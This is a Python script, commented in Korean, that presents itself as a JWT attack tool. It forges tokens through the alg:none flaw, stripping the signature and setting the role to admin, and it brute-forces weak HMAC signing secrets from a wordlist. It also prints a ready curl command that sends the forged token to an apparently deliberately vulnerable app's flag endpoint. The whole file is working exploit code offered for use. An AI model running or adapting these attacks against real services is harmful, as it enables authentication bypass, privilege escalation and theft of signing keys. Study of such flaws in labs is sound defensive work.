#!/usr/bin/env python3
"""
JWT 취약점 공격 스크립트
Usage:
  python3 jwt_attack.py --token <JWT>        # alg:none 공격
  python3 jwt_attack.py --crack <JWT>        # 약한 시크릿 브루트포스
"""
import sys, base64, json, hmac, hashlib, argparse

def b64_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def alg_none_attack(token: str) -> str:
    """alg:none 공격 - 서명 제거 후 role=admin 으로 조작"""
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] 유효하지 않은 JWT 형식")
        return ""

    header  = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))

    print(f"[*] 원본 헤더:  {header}")
    print(f"[*] 원본 페이로드: {payload}")

    # 헤더 변조
    header["alg"] = "none"
    # 페이로드 변조
    payload["role"] = "admin"

    new_header  = b64_encode(json.dumps(header,  separators=(",",":")).encode())
    new_payload = b64_encode(json.dumps(payload, separators=(",",":")).encode())
    forged = f"{new_header}.{new_payload}."

    print(f"\n[+] 위조된 토큰:\n{forged}")
    print(f"\n[+] 테스트 명령:\ncurl -H 'Authorization: Bearer {forged}' http://vuln-app:5000/jwt/flag")
    return forged

def brute_force(token: str, wordlist: str = "/usr/share/wordlists/rockyou-75.txt"):
    """약한 시크릿 브루트포스"""
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] 유효하지 않은 JWT 형식")
        return

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig = b64_decode(parts[2])

    print(f"[*] 브루트포스 시작: {wordlist}")
    try:
        with open(wordlist) as f:
            for i, line in enumerate(f):
                secret = line.strip().encode()
                expected = hmac.new(secret, signing_input, hashlib.sha256).digest()
                if expected == sig:
                    print(f"\n[+] 시크릿 발견! → '{secret.decode()}' (시도: {i+1}번)")
                    return
                if i % 10000 == 0:
                    print(f"[*] {i}개 시도 중...", end="\r")
    except FileNotFoundError:
        print(f"[-] 워드리스트 없음: {wordlist}")
    print("\n[-] 시크릿을 찾지 못했습니다.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT 공격 도구")
    parser.add_argument("--token", help="대상 JWT 토큰")
    parser.add_argument("--crack",  help="브루트포스할 JWT 토큰")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/rockyou-75.txt")
    args = parser.parse_args()

    if args.token:
        alg_none_attack(args.token)
    elif args.crack:
        brute_force(args.crack, args.wordlist)
    else:
        parser.print_help()
